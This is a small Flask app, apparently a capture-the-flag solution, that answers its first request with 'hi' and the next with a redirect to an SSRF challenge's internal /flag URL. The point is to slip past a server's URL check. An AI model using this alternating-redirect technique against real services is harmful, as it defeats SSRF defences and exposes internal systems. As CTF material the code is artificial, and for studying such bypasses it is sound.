from flask import Flask, redirect

app = Flask(__name__)

status = 0

@app.route('/')
def flag():
    global status
    if status == 0:
        status = 1
        return "hi"

    else:
        status = 0
        return redirect("http://ssrf.chall.seetf.sg:1337/flag", code=302)

